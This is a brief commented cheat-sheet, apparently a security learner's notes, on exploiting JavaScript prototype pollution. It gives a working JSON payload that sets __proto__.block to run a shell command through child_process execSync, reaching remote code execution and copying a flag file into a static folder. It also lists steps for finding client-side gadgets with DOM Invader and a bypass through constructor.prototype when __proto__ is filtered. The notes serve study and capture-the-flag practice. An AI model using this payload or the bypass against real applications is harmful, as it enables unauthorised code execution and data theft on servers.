// Prototype Pollution
//! Exploiting
//* Prototype pollution to RCE.
// {
//   "artist.name":"Gingell",
//   "__proto__.block": {
//     "type": "Text",
//     "line":
//     "console.log(process.mainModule.require('child_process').execSync('cat flag > /app/static/pwned').toString())"
//   }
// }
//* Finding client-side prototype pollution sources using DOM Invader
// enable dom invador (extention)
// select prototype pullotion option
// scan for gadgets
// expoit
//* filtered __proto__
// usually they forget the .constructor.prototype
// which also lead to the prototype